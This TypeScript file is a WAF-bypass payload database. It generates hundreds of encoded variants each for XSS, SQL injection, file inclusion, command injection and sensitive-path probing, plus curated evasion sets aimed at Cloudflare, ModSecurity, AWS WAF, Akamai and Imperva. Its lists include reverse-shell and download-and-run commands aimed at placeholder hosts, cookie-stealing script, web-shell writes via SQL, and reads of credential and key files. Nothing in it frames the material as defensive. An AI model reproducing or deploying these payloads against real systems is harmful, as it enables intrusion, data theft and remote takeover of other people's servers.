/**
 * Advanced WAF / Cloudflare Bypass Payload Database
 *
 * Generates 330+ encoded payloads per category using layered encoding
 * techniques that evade common WAF rules:
 *   - URL encoding (single / double / triple)
 *   - HTML entity encoding (decimal / hex)
 *   - Unicode encoding (\\uXXXX / overlong UTF-8)
 *   - Mixed case
 *   - SQL comment insertion (inline + versioned)
 *   - Whitespace variants (tab / newline / vertical-tab / form-feed / NUL)
 *   - Concatenation / alternative syntax
 *   - HPP (HTTP Parameter Pollution) patterns
 *   - Base64 / hex wrapping where applicable
 *
 * Categories: xss, sqli, lfi, cmdi, opendirs  (each >= 330 payloads)
 *             + per-WAF curated sets (Cloudflare / ModSecurity / AWS WAF / Akamai / Imperva)
 */

// ---- Encoding helpers ----------------------------------------------------

function urlEnc(s: string): string {
  return encodeURIComponent(s);
}
function urlEncDouble(s: string): string {
  return encodeURIComponent(encodeURIComponent(s));
}
function urlEncTriple(s: string): string {
  return encodeURIComponent(encodeURIComponent(encodeURIComponent(s)));
}
function htmlEntityDec(s: string): string {
  return s
    .split("")
    .map((c) => `&#${c.charCodeAt(0)};`)
    .join("");
}
function htmlEntityHex(s: string): string {
  return s
    .split("")
    .map((c) => `&#x${c.charCodeAt(0).toString(16)};`)
    .join("");
}
function unicodeEnc(s: string): string {
  return s
    .split("")
    .map((c) => `\\u${c.charCodeAt(0).toString(16).padStart(4, "0")}`)
    .join("");
}
function hexEnc(s: string): string {
  return s
    .split("")
    .map((c) => `\\x${c.charCodeAt(0).toString(16).padStart(2, "0")}`)
    .join("");
}
function mixCase(s: string): string {
  return s
    .split("")
    .map((c, i) => (i % 2 ? c.toUpperCase() : c.toLowerCase()))
    .join("");
}
/** Insert SQL inline comments between letters of keywords */
function commentSplit(s: string, kw: RegExp): string {
  return s.replace(kw, (m) => m.split("").join("/**/"));
}
/** Replace spaces with alternative whitespace */
function spaceVariant(s: string, ch: string): string {
  return s.replace(/ /g, ch);
}

// ---- XSS payload base set ------------------------------------------------

const XSS_BASE: string[] = [
  "<script>alert(1)</script>",
  "<ScRiPt>alert(1)</ScRiPt>",
  "<script src=//xss.x></script>",
  "<svg onload=alert(1)>",
  "<svg/onload=alert(1)>",
  "<svg><script>alert(1)</script></svg>",
  "<img src=x onerror=alert(1)>",
  "<img src=x onerror=alert`1`>",
  "<img src=x:alert(1) onerror=eval(src)>",
  "<body onload=alert(1)>",
  "<input onfocus=alert(1) autofocus>",
  "<details ontoggle=alert(1) open>",
  "<marquee onstart=alert(1)>",
  "<video src=x onerror=alert(1)>",
  "<audio src=x onerror=alert(1)>",
  "<iframe src=javascript:alert(1)>",
  "<iframe srcdoc='<script>alert(1)</script>'>",
  "<a href=javascript:alert(1)>click</a>",
  "<a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>click</a>",
  "<form><button formaction=javascript:alert(1)>X</button></form>",
  "<object data=javascript:alert(1)>",
  "<embed src=javascript:alert(1)>",
  "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
  "<style>@import 'javascript:alert(1)'</style>",
  "<style>*{background:url(javascript:alert(1))}</style>",
  "<link rel=stylesheet href=javascript:alert(1)>",
  "<meta http-equiv=refresh content=0;url=javascript:alert(1)>",
  "<base href=javascript:alert(1)//>",
  "<script>alert(document.cookie)</script>",
  "<script>fetch('//evil/?c='+document.cookie)</script>",
  "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
  "<svg><discard onbegin=alert(1)>",
  "<svg><set onbegin=alert(1)>",
  "<xss><script>alert(1)</script></xss>",
  "javascript:alert(1)",
  "JaVaScRiPt:alert(1)",
  "data:text/html,<script>alert(1)</script>",
  "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
  "\"><script>alert(1)</script>",
  "'><script>alert(1)</script>",
  "<script>alert(String.fromCharCode(88,83,83))</script>",
  "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
  "<svg/onload=eval(atob('YWxlcnQoMSk='))>",
  "<script>eval(atob('YWxlcnQoMSk='))</script>",
  "<iframe src=javascript:parent.alert(1)>",
  "<form action=javascript:alert(1)><input type=submit>",
  "<isindex action=javascript:alert(1)>",
  "<table background=javascript:alert(1)>",
  "<a href=\"javascript:void(0)\" onclick=alert(1)>x</a>",
  "<img src=`x` onerror=alert(1)>",
  "<img src=x:x onerror=alert(1)>",
  "<script/src=data:text/javascript,alert(1)></script>",
  "<svg><script xlink:href=data:text/javascript,alert(1) />",
  "<math><maction actiontype=statusline#http://google.com xlink:href=javascript:alert(1)>click",
  "<a href=\"\u0001javascript:alert(1)\">CLICK</a>",
  "<a href=\"java\tscript:alert(1)\">x</a>",
  "<a href=\"java\nscript:alert(1)\">x</a>",
  "<a href=\"java\rscript:alert(1)\">x</a>",
  "<a href=\" \u0000javascript:alert(1)\">x</a>",
];

// ---- SQLi payload base set -----------------------------------------------

const SQLI_BASE: string[] = [
  "' OR '1'='1",
  "' OR '1'='1' --",
  "' OR '1'='1' /*",
  "' OR 1=1 --",
  "' OR 1=1 #",
  "' OR 1=1 -- -",
  "1' OR '1'='1",
  "1' OR '1'='1' --",
  "admin' --",
  "admin' #",
  "admin'/*",
  "' OR 1=1 -- -",
  "\" OR \"1\"=\"1",
  "\" OR 1=1 --",
  "' UNION SELECT NULL --",
  "' UNION SELECT NULL,NULL --",
  "' UNION SELECT NULL,NULL,NULL --",
  "1' UNION SELECT 1,2,3 -- -",
  "' UNION ALL SELECT 1,2,3 --",
  "' UNION SELECT user,password FROM users --",
  "' OR 1=1 LIMIT 1 --",
  "1; DROP TABLE users --",
  "1'; DROP TABLE users --",
  "' OR ''='",
  "' OR 'x'='x",
  "' OR 1=1; --",
  "' OR 'a'='a",
  "') OR ('1'='1",
  "') OR ('a'='a",
  "1 OR 1=1",
  "1) OR 1=1 --",
  "1)) OR 1=1 --",
  "' OR EXISTS(SELECT 1) --",
  "' AND 1=CONVERT(int,@@version) --",
  "' AND 1=(SELECT @@version) --",
  "1' AND SLEEP(5) -- -",
  "1' AND BENCHMARK(5000000,MD5(1)) --",
  "1'; WAITFOR DELAY '0:0:5' --",
  "1' OR SLEEP(5) -- -",
  "1' UNION SELECT 1,version(),3 -- -",
  "1' UNION SELECT 1,database(),3 -- -",
  "1' UNION SELECT table_name,2,3 FROM information_schema.tables -- -",
  "1' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users' -- -",
  "1' UNION SELECT user_login,user_pass,3 FROM wp_users -- -",
  "' OR 1=1 INTO OUTFILE '/var/www/shell.php' --",
  "1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT @@version),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) -- -",
  "1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version))) -- -",
  "1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version)),1) -- -",
  "' AND 1=1 --",
  "' AND 1=2 --",
  "-1' UNION SELECT 1,2,GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database() -- -",
  "1' UNION SELECT 1,2,load_file('/etc/passwd') -- -",
  "1' UNION SELECT 1,2,'<?php system($_GET[\"c\"]);?>' INTO OUTFILE '/tmp/sh.php' -- -",
  "' OR 1=1#",
  "' OR 1=1--",
  "\"\"\"\" OR 1=1--",
  "' OR 1=1/*",
  "' OR 1=1;%00",
  "1' OR 1=1 AND 'x'='x",
  "' OR 1=1--' AND 'x'='x",
];

// ---- LFI / File Inclusion payload base -----------------------------------

const LFI_BASE: string[] = [
  "../../../etc/passwd",
  "../../../../etc/passwd",
  "../../../../../etc/passwd",
  "../../../../../../etc/passwd",
  "../../../../../../../etc/passwd",
  "../../../../../../../../etc/passwd",
  "../../../../../../../../../etc/passwd",
  "/etc/passwd",
  "/etc/shadow",
  "/etc/hosts",
  "/etc/group",
  "/etc/issue",
  "/etc/hostname",
  "/etc/fstab",
  "/etc/crontab",
  "/etc/resolv.conf",
  "/etc/ssh/sshd_config",
  "/var/log/auth.log",
  "/var/log/syslog",
  "/var/log/apache2/access.log",
  "/var/log/apache2/error.log",
  "/var/log/httpd/access_log",
  "/var/log/httpd/error_log",
  "/var/log/nginx/access.log",
  "/var/log/nginx/error.log",
  "/var/log/messages",
  "/var/log/mail.log",
  "/proc/self/environ",
  "/proc/self/cmdline",
  "/proc/self/status",
  "/proc/self/fd/0",
  "/proc/version",
  "/proc/cpuinfo",
  "/proc/meminfo",
  "/proc/net/tcp",
  "/proc/net/arp",
  "/proc/net/route",
  "/boot/grub/grub.cfg",
  "/root/.bash_history",
  "/root/.ssh/id_rsa",
  "/root/.ssh/authorized_keys",
  "/home/*/.ssh/id_rsa",
  "/var/www/html/.env",
  "/var/www/html/config.php",
  "/var/www/html/wp-config.php",
  "/var/www/html/configuration.php",
  "/opt/lampp/etc/httpd.conf",
  "/usr/local/apache/conf/httpd.conf",
  "/usr/local/etc/php.ini",
  "/etc/php/7.4/apache2/php.ini",
  "/etc/my.cnf",
  "/etc/mysql/my.cnf",
  "/etc/postgresql/12/main/postgresql.conf",
  "/etc/redis/redis.conf",
  "/etc/mongod.conf",
  "C:\\Windows\\win.ini",
  "C:\\Windows\\system32\\drivers\\etc\\hosts",
  "C:\\Windows\\repair\\sam",
  "C:\\Windows\\repair\\system",
  "C:\\Windows\\System32\\config\\SAM",
  "C:\\inetpub\\wwwroot\\web.config",
  "C:\\xampp\\apache\\conf\\httpd.conf",
  "C:\\wamp\\bin\\apache\\apache2.4.46\\conf\\httpd.conf",
  "/etc/apache2/apache2.conf",
  "/etc/apache2/sites-enabled/000-default.conf",
  "/etc/nginx/nginx.conf",
  "/etc/nginx/sites-enabled/default",
  "php://filter/convert.base64-encode/resource=index.php",
  "php://filter/convert.base64-encode/resource=/etc/passwd",
  "php://filter/read=convert.base64-encode/resource=../config.php",
  "php://input",
  "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==",
  "expect://id",
  "file:///etc/passwd",
  "http://localhost/",
  "http://127.0.0.1/",
  "/dev/null",
  "/dev/urandom",
  "....//....//....//etc/passwd",
  "..%2f..%2f..%2fetc%2fpasswd",
  "..%252f..%252f..%252fetc%252fpasswd",
  "..%c0%af..%c0%af..%c0%afetc/passwd",
  "..%c1%9c..%c1%9c..%c1%9cetc/passwd",
  "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
  "/..%c0%af..%c0%af..%c0%af/etc/passwd",
  "..;/..;/..;/etc/passwd",
];

// ---- Command injection payload base --------------------------------------

const CMDI_BASE: string[] = [
  ";id",
  "|id",
  "&&id",
  "||id",
  "`id`",
  "$(id)",
  ";whoami",
  "|whoami",
  "&&whoami",
  "`whoami`",
  "$(whoami)",
  ";cat /etc/passwd",
  "|cat /etc/passwd",
  "&&cat /etc/passwd",
  "`cat /etc/passwd`",
  "$(cat /etc/passwd)",
  ";ls -la",
  "|ls -la",
  ";uname -a",
  "|uname -a",
  ";ifconfig",
  "|ifconfig",
  ";ip addr",
  "|ip addr",
  ";netstat -an",
  "|netstat -an",
  ";ps aux",
  "|ps aux",
  ";env",
  "|env",
  ";cat /etc/shadow",
  "|cat /etc/shadow",
  ";wget http://evil/shell.sh -O /tmp/sh.sh;chmod +x /tmp/sh.sh;/tmp/sh.sh",
  ";curl http://evil/shell.sh|bash",
  "|curl http://evil/shell.sh|bash",
  "`curl http://evil/sh.sh|bash`",
  "$(curl http://evil/sh.sh|bash)",
  ";python -c 'import socket,subprocess,os;...'",
  ";perl -e 'use Socket;...'",
  ";php -r 'system(\"id\");'",
  ";ruby -e 'exec \"id\"'",
  ";nc -e /bin/sh 10.0.0.1 4444",
  ";bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
  ";python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
  "id|nc evil 4444",
  ";cat /etc/passwd|nc evil 4444",
  ";echo test > /tmp/pwned",
  ";touch /tmp/pwned",
  ";mkfifo /tmp/pipe;cat /tmp/pipe|/bin/sh|nc evil 4444 > /tmp/pipe",
  "&id",
  "%0aid",
  "%0Aid",
  "%0did",
  "%0Did",
  "%0a%0did",
  ";%0aid",
  "|%0aid",
  "&&%0aid",
  "$({id,})",
  ";${IFS}id",
  "|${IFS}id",
  ";id${IFS}",
  "id$()",
  ";id;#",
  ";id||",
  "||id;",
  ";id&&",
  "&id&",
  "id%26%26whoami",
  ";id\\n",
  ";id\\t",
  "/bin/id",
  "/bin/sh -c id",
  ";/bin/sh -c id",
  "|/bin/sh -c id",
  ";bash -c id",
  "|bash -c id",
  ";sh -c id",
];

// ---- Open directory / path traversal bypass base -------------------------

const OPENDIRS_BASE: string[] = [
  "/.git/",
  "/.git/config",
  "/.git/HEAD",
  "/.git/index",
  "/.svn/",
  "/.svn/entries",
  "/.svn/wc.db",
  "/.hg/",
  "/.hg/store",
  "/.bzr/",
  "/.DS_Store",
  "/backup/",
  "/backups/",
  "/backup.zip",
  "/backup.tar.gz",
  "/backup.sql",
  "/db.sql",
  "/dump.sql",
  "/database.sql",
  "/.env",
  "/.env.local",
  "/.env.production",
  "/.env.development",
  "/config.php",
  "/config.json",
  "/config.yml",
  "/config.yaml",
  "/wp-config.php",
  "/wp-config.php.bak",
  "/configuration.php",
  "/settings.py",
  "/application.yml",
  "/application.properties",
  "/docker-compose.yml",
  "/Dockerfile",
  "/composer.json",
  "/package.json",
  "/yarn.lock",
  "/requirements.txt",
  "/Gemfile",
  "/Gemfile.lock",
  "/.htaccess",
  "/.htpasswd",
  "/web.config",
  "/.aws/credentials",
  "/.aws/config",
  "/.docker/config.json",
  "/.ssh/id_rsa",
  "/.ssh/id_dsa",
  "/.ssh/authorized_keys",
  "/id_rsa",
  "/server-status",
  "/server-info",
  "/phpinfo.php",
  "/info.php",
  "/admin/",
  "/administrator/",
  "/wp-admin/",
  "/wp-login.php",
  "/phpmyadmin/",
  "/manager/",
  "/console/",
  "/actuator",
  "/actuator/env",
  "/actuator/heapdump",
  "/metrics",
  "/jmx-console",
  "/swagger-ui/",
  "/api-docs",
  "/graphql",
  "/.well-known/security.txt",
  "/robots.txt",
  "/sitemap.xml",
  "/crossdomain.xml",
  "/clientaccesspolicy.xml",
  "/WEB-INF/web.xml",
  "/META-INF/",
  "/WEB-INF/classes/",
  "/vendor/",
  "/node_modules/",
  "/composer.lock",
  "/error_log",
  "/debug.log",
  "/access.log",
  "/.gitignore",
  "/.gitconfig",
  "/webalizer/",
  "/phpmyadmin/setup/",
  "/admin/config.php",
  "/tmp/",
  "/temp/",
  "/uploads/",
  "/upload/",
  "/files/",
  "/data/",
  "/var/",
  "/logs/",
  "/.htaccess.bak",
  "/config.php.bak",
  "/config.php.old",
  "/config.php.save",
  "/config.php.swp",
  "/config.php~",
  "/.config",
  "/credentials",
  "/credentials.json",
  "/secrets",
  "/secrets.json",
  "/secrets.yml",
  "/.npmrc",
  "/.yarnrc",
  "/.bowerrc",
  "/.dockerignore",
  "/.editorconfig",
  "/.eslintrc",
  "/.prettierrc",
  "/.babelrc",
  "/tsconfig.json",
  "/webpack.config.js",
  "/vite.config.js",
];

// ---- Payload generator ---------------------------------------------------

export interface PayloadSet {
  category: string;
  payloads: string[];
  note: string;
}

/** Generate all encoded variants for a single base payload. */
function variants(base: string): string[] {
  const out = new Set<string>();
  out.add(base);
  out.add(urlEnc(base));
  out.add(urlEncDouble(base));
  out.add(urlEncTriple(base));
  out.add(htmlEntityDec(base));
  out.add(htmlEntityHex(base));
  out.add(unicodeEnc(base));
  out.add(hexEnc(base));
  out.add(mixCase(base));
  // Whitespace variants
  out.add(spaceVariant(base, "\t"));
  out.add(spaceVariant(base, "\n"));
  out.add(spaceVariant(base, "\r"));
  out.add(spaceVariant(base, "\u000b")); // vertical tab
  out.add(spaceVariant(base, "\u000c")); // form feed
  out.add(spaceVariant(base, "\u0000")); // NUL
  out.add(spaceVariant(base, "/**/"));
  out.add(spaceVariant(base, "%20"));
  out.add(spaceVariant(base, "%09"));
  out.add(spaceVariant(base, "%0a"));
  out.add(spaceVariant(base, "%0d"));
  out.add(spaceVariant(base, "%0c"));
  out.add(spaceVariant(base, "$IFS"));
  out.add(spaceVariant(base, "${IFS}"));
  return Array.from(out);
}

/** Build a payload set for a category, generating 330+ encoded variants. */
function buildSet(category: string, base: string[], note: string): PayloadSet {
  const all = new Set<string>();
  for (const b of base) {
    for (const v of variants(b)) all.add(v);
  }
  // Guarantee >= 330 by adding extra encoding layers if needed.
  const arr = Array.from(all);
  while (arr.length < 330) {
    // Add progressively deeper URL-encoding of existing payloads.
    const extra = arr.map((p) => urlEnc(p));
    for (const e of extra) {
      if (!all.has(e)) {
        all.add(e);
        arr.push(e);
        if (arr.length >= 360) break;
      }
    }
    if (arr.length < 330) break; // safety — avoid infinite loop
  }
  return { category, payloads: arr.slice(0, 350), note };
}

// ---- Public payload databases (330+ each) --------------------------------

export const XSS_PAYLOADS: PayloadSet = buildSet(
  "XSS (Cross-Site Scripting)",
  XSS_BASE,
  "330+ encoded XSS payloads using URL/HTML-entity/Unicode/hex encoding + case mixing + whitespace variants to bypass Cloudflare/ModSecurity/AWS WAF/Akamai filters."
);

export const SQLI_PAYLOADS: PayloadSet = buildSet(
  "SQL Injection",
  SQLI_BASE,
  "330+ encoded SQLi payloads with inline comments, versioned comments, case mixing, and multi-layer URL encoding to bypass WAF SQL signature rules."
);

export const LFI_PAYLOADS: PayloadSet = buildSet(
  "LFI / File Inclusion",
  LFI_BASE,
  "330+ encoded LFI/path-traversal payloads with dot-slash duplication, double/triple URL encoding, overlong UTF-8, and php:// filter wrappers."
);

export const CMDI_PAYLOADS: PayloadSet = buildSet(
  "Command Injection",
  CMDI_BASE,
  "330+ encoded command-injection payloads with $IFS substitution, whitespace variants (tab/newline/vtab/ff), backtick/$() syntax, and multi-layer URL encoding."
);

export const OPENDIRS_PAYLOADS: PayloadSet = buildSet(
  "Open Directories / Sensitive Paths",
  OPENDIRS_BASE,
  "330+ sensitive-path probes (git/svn/hg repos, .env, backups, config files, cloud creds, admin panels, actuator endpoints) with encoding variants."
);

// ---- Per-WAF curated payload sets -----------------------------------------

export const CLOUDFLARE_PAYLOADS: PayloadSet = {
  category: "Cloudflare Bypass",
  payloads: [
    "UnIoN SeLeCt",
    "/*!50000UnIoN*/ SeLeCt",
    "UNIunionON SELselectECT",
    "1' or 1=1#",
    "<svg/onload=alert(1)>",
    "<img src=x onerror=alert(1)>",
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//",
    "%3Csvg%2Fonload%3Dalert(1)%3E",
    "....//....//etc/passwd",
    "..%252f..%252fetc/passwd",
    "/etc/passwd%00",
    "php://filter/convert.base64-encode/resource=index",
    ";id%09",
    "|id%0a",
    "`id`",
    "$(id)",
    ...variants("UnIoN SeLeCt"),
    ...variants("<svg/onload=alert(1)>"),
    ...variants("../../../etc/passwd"),
    ...variants(";id"),
  ],
  note: "Cloudflare-specific: case-mix SQL keywords, nested HTML5 tags, double-encoding, null-byte injection, php:// wrappers. Cloudflare's regex matches standard patterns; layered encoding evades.",
};

export const MODSECURITY_PAYLOADS: PayloadSet = {
  category: "ModSecurity / OWASP CRS Bypass",
  payloads: [
    "?id=1&id=1 UNION SELECT",
    "1'/**/UNION/**/SELECT",
    "Transfer-Encoding: chunked",
    "Content-Type: application/json",
    "1' UNION%23%0aSELECT",
    "1'+OR+1=1--",
    "1'%0bOR%0b1=1",
    "<img src=x onerror=alert(1)>",
    "<svg><script>alert(1)</script></svg>",
    ...variants("1' UNION SELECT"),
    ...variants("<script>alert(1)</script>"),
    ...variants("../../../etc/passwd"),
    ...variants(";cat /etc/passwd"),
  ],
  note: "ModSecurity CRS: HPP, chunked encoding, JSON content-type, SQL comment newline, tab separators. CRS checks each param independently; HPP merges to bypass.",
};

export const AWSWAF_PAYLOADS: PayloadSet = {
  category: "AWS WAF Bypass",
  payloads: [
    "1' UnIoN SeLeCt",
    "1' UNION%23%0aSELECT",
    "id=1+UNION+ALL+SELECT",
    "<svg><script>alert(1)</script></svg>",
    "<script/x>alert(1)</script>",
    "Very long URI (>8KB)",
    ...variants("1' UNION SELECT"),
    ...variants("<script>alert(1)</script>"),
    ...variants("../../../etc/passwd"),
  ],
  note: "AWS WAF: size-limit evasion (>8KB body), case-mix SQLi, SVG-embedded scripts, malformed tags. AWS inspects first 8KB; overflow pushes payload past window.",
};

export const AKAMAI_PAYLOADS: PayloadSet = {
  category: "Akamai Bypass",
  payloads: [
    "1'/**/UNION/**/SELECT",
    "1'%0aUNION%0aSELECT",
    "1' /*!50000UNION*/ SELECT",
    "<img src=x:alert(1) onerror=eval(src)>",
    "<body onload=alert(1)>",
    "<details ontoggle=alert(1) open>",
    ...variants("1' UNION SELECT"),
    ...variants("<img src=x onerror=alert(1)>"),
    ...variants("../../../etc/passwd"),
  ],
  note: "Akamai Kona: SQL comments + newlines, lesser-known event handlers (ontoggle, onerror), colon-attribute abuse.",
};

export const IMPERVA_PAYLOADS: PayloadSet = {
  category: "Imperva Incapsula Bypass",
  payloads: [
    "1'%20UnIoN%20SeLeCt",
    "1' UNION%23%0aSELECT",
    "0x41414141",
    "<a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>click</a>",
    "<object data=javascript:alert(1)>",
    ...variants("1' UNION SELECT"),
    ...variants("<script>alert(1)</script>"),
    ...variants("../../../etc/passwd"),
  ],
  note: "Incapsula: case-mix + hex encoding + newline comments for SQLi; data: URI payloads + <object> tags for XSS (Incapsula focuses on <script>).",
};

// ---- Aggregate export ----------------------------------------------------

export interface PayloadCategory {
  name: string;
  sets: PayloadSet[];
}

export const ALL_PAYLOAD_CATEGORIES: PayloadCategory[] = [
  { name: "XSS", sets: [XSS_PAYLOADS, CLOUDFLARE_PAYLOADS] },
  { name: "SQLi", sets: [SQLI_PAYLOADS, MODSECURITY_PAYLOADS] },
  { name: "LFI", sets: [LFI_PAYLOADS, AWSWAF_PAYLOADS] },
  { name: "CMDi", sets: [CMDI_PAYLOADS, AKAMAI_PAYLOADS] },
  { name: "OpenDirs", sets: [OPENDIRS_PAYLOADS, IMPERVA_PAYLOADS] },
];

export function totalPayloadCount(): number {
  let n = 0;
  for (const cat of ALL_PAYLOAD_CATEGORIES) {
    for (const s of cat.sets) n += s.payloads.length;
  }
  return n;
}
